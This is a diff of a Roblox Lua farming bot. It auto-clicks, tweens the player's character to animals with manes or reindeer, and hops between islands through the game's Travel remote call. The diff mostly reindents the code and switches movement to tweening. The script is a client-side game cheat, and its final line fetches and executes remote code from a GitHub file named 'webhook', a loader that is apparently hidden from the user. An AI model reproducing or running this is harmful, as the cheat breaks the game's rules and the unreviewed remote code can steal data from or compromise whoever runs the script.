@@ -4,6 +4,7 @@ local lp = players.LocalPlayer
 local playerGui = lp:WaitForChild("PlayerGui")
 local VIM = game:GetService("VirtualInputManager")
 local Camera = workspace.CurrentCamera
+local TweenService = game:GetService("TweenService")
 
 -- State
 local currentTask
@@ -12,43 +13,57 @@ local isPaused = false
 local currentIslandIndex = 1
 local clickLoop = nil
 local islands = {
-	"Jungle Island",
-	"Lunar Islands",
-	"Volcano Island"
+    "Jungle Island",
+    "Lunar Islands",
+    "Volcano Island"
 }
 
 -- Virtual Input Manager Functions
-local function getScreenSize()
-	return Camera.ViewportSize
-end
-
 local function getClickPosition()
-	local screenSize = getScreenSize()
-	local x = screenSize.X - 300
-	local y = 30
-	return x, y
+    local screenSize = Camera.ViewportSize
+    local x = screenSize.X - 300
+    local y = 30
+    return x, y
 end
 
 local function clickAt(x, y)
-	VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
-	task.wait(0.05)
-	VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
+    VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
+    task.wait(0.05)
+    VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
 end
 
 local function startAutoClicker()
-	if clickLoop then
-		task.cancel(clickLoop)
-	end
+    if clickLoop then
+        task.cancel(clickLoop)
+    end
+    clickLoop = task.spawn(function()
+        while true do
+            if not isPaused then
+                local x, y = getClickPosition()
+                clickAt(x, y)
+            end
+            task.wait(1)
+        end
+    end)
+end
 
-	clickLoop = task.spawn(function()
-		while true do
-			if not isPaused then
-				local x, y = getClickPosition()
-				clickAt(x, y)
-			end
-			task.wait(0.5)
-		end
-	end)
+-- Tween player to position
+local function tweenToPosition(targetPos, speed)
+    speed = speed or 50
+    local char = lp.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local distance = (targetPos - hrp.Position).Magnitude
+    if distance < 0.5 then return end
+    local duration = distance / speed
+
+    local targetCFrame = CFrame.new(targetPos, targetPos + hrp.CFrame.LookVector)
+    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = targetCFrame})
+    tween:Play()
+    tween.Completed:Wait()
 end
 
 -- Create GUI
@@ -72,7 +87,7 @@ local islandLabel = Instance.new("TextLabel")
 islandLabel.Size = UDim2.new(1, -20, 0, 30)
 islandLabel.Position = UDim2.new(0, 10, 0, 10)
 islandLabel.BackgroundTransparency = 1
-islandLabel.Text = "High Islands"
+islandLabel.Text = "Low Islands"
 islandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 islandLabel.TextSize = 14
 islandLabel.Font = Enum.Font.GothamBold
@@ -95,211 +110,187 @@ buttonCorner.Parent = pauseButton
 
 -- Island Travel Function
 local function movePlayerToIsland(islandName)
-	local char = lp.Character or lp.CharacterAdded:Wait()
+    local char = lp.Character or lp.CharacterAdded:Wait()
 
-	local islandFolder = workspace.Islands:FindFirstChild(islandName)
-	if not islandFolder then
-		warn("Island not found:", islandName)
-		return false
-	end
+    local islandFolder = workspace.Islands:FindFirstChild(islandName)
+    if not islandFolder then
+        warn("Island not found:", islandName)
+        return false
+    end
 
-	print("Attempting to travel to:", islandName)
+    print("Attempting to travel to:", islandName)
 
-	local References = game:GetService("ReplicatedStorage"):WaitForChild("References")
-	local Utilities = require(References).Utilities
+    local References = game:GetService("ReplicatedStorage"):WaitForChild("References")
+    local Utilities = require(References).Utilities
 
-	local function attemptTravel()
-		char = lp.Character or lp.CharacterAdded:Wait()
-		local hrp = char:FindFirstChild("HumanoidRootPart")
-		local posBefore = hrp and hrp.Position or Vector3.new(0, 0, 0)
+    local function attemptTravel()
+        char = lp.Character or lp.CharacterAdded:Wait()
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local posBefore = hrp and hrp.Position or Vector3.new(0, 0, 0)
 
-		-- Fire invoke in separate thread so it doesn't block the position watcher
-		task.spawn(function()
-			local success, result = pcall(function()
-				return Utilities.Network:InvokeServer("Travel", "Travel", islandName, nil, nil)
-			end)
+        task.spawn(function()
+            local success, result = pcall(function()
+                return Utilities.Network:InvokeServer("Travel", "Travel", islandName, nil, nil)
+            end)
+            if success then
+                print("Travel invoked for:", islandName, "| Result:", result)
+            else
+                warn("Travel invoke failed:", result)
+            end
+        end)
 
-			if success then
-				print("Travel invoked for:", islandName, "| Result:", result)
-			else
-				warn("Travel invoke failed:", result)
-			end
-		end)
+        local deadline = tick() + 30
+        while tick() < deadline do
+            task.wait(0.2)
+            char = lp.Character
+            if char then
+                local hrpNow = char:FindFirstChild("HumanoidRootPart")
+                if hrpNow and (hrpNow.Position - posBefore).Magnitude >= 40 then
+                    print("Teleport confirmed! Moved " .. math.floor((hrpNow.Position - posBefore).Magnitude) .. " studs.")
+                    return true
+                end
+            end
+        end
 
-		-- Position watcher starts immediately alongside the invoke
-		local deadline = tick() + 30
-		while tick() < deadline do
-			task.wait(0.2)
+        print("30s elapsed without 40 stud movement. Retrying invoke...")
+        return false
+    end
 
-			char = lp.Character
-			if char then
-				local hrpNow = char:FindFirstChild("HumanoidRootPart")
-				if hrpNow and (hrpNow.Position - posBefore).Magnitude >= 40 then
-					print("Teleport confirmed! Moved " .. math.floor((hrpNow.Position - posBefore).Magnitude) .. " studs.")
-					return true
-				end
-			end
-		end
-
-		print("30s elapsed without 40 stud movement. Retrying invoke...")
-		return false
-	end
-
-	local attempts = 0
-	while true do
-		attempts = attempts + 1
-		print("Travel attempt #" .. attempts .. " to: " .. islandName)
-		if attemptTravel() then
-			task.wait(1)
-			return true
-		end
-	end
+    local attempts = 0
+    while true do
+        attempts = attempts + 1
+        print("Travel attempt #" .. attempts .. " to: " .. islandName)
+        if attemptTravel() then
+            task.wait(1)
+            return true
+        end
+    end
 end
 
 -- Follow Logic
 local function followLoopFrom(folder)
-	shouldStop = true
-	task.wait(0.3)
-	shouldStop = false
+    shouldStop = true
+    task.wait(0.3)
+    shouldStop = false
 
-	local function getValidTargets()
-		local targets = {}
-		for _, model in ipairs(folder:GetChildren()) do
-			if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
-				local hasManeMesh = model:FindFirstChild("maneMesh")
-				local isReindeer = false
+    local function getValidTargets()
+        local targets = {}
+        for _, model in ipairs(folder:GetChildren()) do
+            if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
+                local hasManeMesh = model:FindFirstChild("maneMesh")
+                local isReindeer = false
+                local overheadPart = model:FindFirstChild("OverheadPart")
+                if overheadPart then
+                    local overHead = overheadPart:FindFirstChild("OverHead")
+                    if overHead then
+                        local breedLabel = overHead:FindFirstChild("BreedLabel")
+                        if breedLabel and breedLabel.Text == "Reindeer" then
+                            isReindeer = true
+                        end
+                    end
+                end
+                if hasManeMesh or isReindeer then
+                    table.insert(targets, model)
+                end
+            end
+        end
+        return targets
+    end
 
-				local overheadPart = model:FindFirstChild("OverheadPart")
-				if overheadPart then
-					local overHead = overheadPart:FindFirstChild("OverHead")
-					if overHead then
-						local breedLabel = overHead:FindFirstChild("BreedLabel")
-						if breedLabel and breedLabel.Text == "Reindeer" then
-							isReindeer = true
-						end
-					end
-				end
+    currentTask = task.spawn(function()
+        local currentTarget = nil
+        local noTargetChecks = 0
 
-				if hasManeMesh or isReindeer then
-					table.insert(targets, model)
-				end
-			end
-		end
-		return targets
-	end
+        while not shouldStop do
+            if isPaused then
+                task.wait(0.5)
+                continue
+            end
 
-	currentTask = task.spawn(function()
-		local currentTarget = nil
-		local lastSwitch = 0
-		local noTargetChecks = 0
+            local char = lp.Character
+            if not char then
+                task.wait(0.2)
+                continue
+            end
 
-		while not shouldStop do
-			if isPaused then
-				task.wait(0.5)
-				continue
-			end
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if not hrp then
+                task.wait(0.2)
+                continue
+            end
 
-			local char = lp.Character
-			if not char then
-				task.wait(0.2)
-				continue
-			end
+            local targets = getValidTargets()
 
-			local hrp = char:FindFirstChild("HumanoidRootPart")
-			local humanoid = char:FindFirstChildOfClass("Humanoid")
-			if not hrp or not humanoid then
-				task.wait(0.2)
-				continue
-			end
+            if #targets == 0 then
+                noTargetChecks = noTargetChecks + 1
 
-			local now = tick()
-			local targets = getValidTargets()
+                if noTargetChecks >= 3 then
+                    print("No valid targets found in:", islands[currentIslandIndex])
 
-			if #targets == 0 then
-				noTargetChecks = noTargetChecks + 1
+                    currentIslandIndex = currentIslandIndex + 1
+                    if currentIslandIndex > #islands then
+                        print("No more islands to check. Restarting from first island.")
+                        currentIslandIndex = 1
+                    end
 
-				if noTargetChecks >= 3 then
-					print("No valid targets found in:", islands[currentIslandIndex])
+                    local nextIsland = islands[currentIslandIndex]
+                    print("Switching to:", nextIsland)
 
-					currentIslandIndex = currentIslandIndex + 1
-					if currentIslandIndex > #islands then
-						print("No more islands to check. Restarting from first island.")
-						currentIslandIndex = 1
-					end
+                    if movePlayerToIsland(nextIsland) then
+                        local newFolder = workspace.Islands:FindFirstChild(nextIsland)
+                        if newFolder then
+                            followLoopFrom(newFolder)
+                            return
+                        end
+                    end
 
-					local nextIsland = islands[currentIslandIndex]
-					print("Switching to:", nextIsland)
+                    noTargetChecks = 0
+                end
 
-					if movePlayerToIsland(nextIsland) then
-						local newFolder = workspace.Islands:FindFirstChild(nextIsland)
-						if newFolder then
-							followLoopFrom(newFolder)
-							return
-						end
-					end
+                task.wait(1)
+            else
+                noTargetChecks = 0
 
-					noTargetChecks = 0
-				end
+                -- Pick new target only if current one is gone
+                if not currentTarget or not currentTarget.Parent then
+                    currentTarget = targets[math.random(1, #targets)]
 
-				task.wait(1)
-			else
-				noTargetChecks = 0
+                    local targetHRP = currentTarget:FindFirstChild("HumanoidRootPart")
+                    if targetHRP then
+                        tweenToPosition(targetHRP.Position + Vector3.new(0, 0, -5))
+                    end
+                end
 
-				if not currentTarget or not currentTarget.Parent or now - lastSwitch >= 15 then
-					local newTarget
-					repeat
-						newTarget = targets[math.random(1, #targets)]
-					until newTarget ~= currentTarget or #targets == 1
+                -- Follow current target
+                if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
+                    local targetHRP = currentTarget.HumanoidRootPart
+                    local distance = (hrp.Position - targetHRP.Position).Magnitude
 
-					currentTarget = newTarget
-					lastSwitch = now
+                    if distance > 6 then
+                        tweenToPosition(targetHRP.Position + Vector3.new(0, 0, -4), 50)
+                    end
+                end
 
-					local targetHRP = currentTarget:FindFirstChild("HumanoidRootPart")
-					if targetHRP then
-						humanoid:MoveTo(targetHRP.Position + Vector3.new(0, 0, -5))
-					end
-				end
-
-				if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
-					local targetHRP = currentTarget.HumanoidRootPart
-					local distance = (hrp.Position - targetHRP.Position).Magnitude
-
-					if distance > 6 then
-						humanoid:MoveTo(targetHRP.Position + Vector3.new(0, 0, -4))
-					end
-
-					if distance > 30 then
-						hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -4)
-					end
-				end
-
-				task.wait(0.2)
-			end
-		end
-	end)
+                task.wait(0.2)
+            end
+        end
+    end)
 end
 
 -- Pause/Resume button
 pauseButton.MouseButton1Click:Connect(function()
-	isPaused = not isPaused
-	if isPaused then
-		pauseButton.Text = "Resume"
-		pauseButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-	else
-		pauseButton.Text = "Pause"
-		pauseButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
-	end
+    isPaused = not isPaused
+    if isPaused then
+        pauseButton.Text = "Resume"
+        pauseButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+    else
+        pauseButton.Text = "Pause"
+        pauseButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
+    end
 end)
 
--- Start auto-clicker
+-- Start
 startAutoClicker()
-
--- Auto-start scanning Jungle Island
 followLoopFrom(workspace.Islands["Jungle Island"])
-
-local lavaParts = workspace.Islands["Volcano Island"]:WaitForChild("LavaParts")
-if lavaParts then
-	lavaParts:Destroy()
-end
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
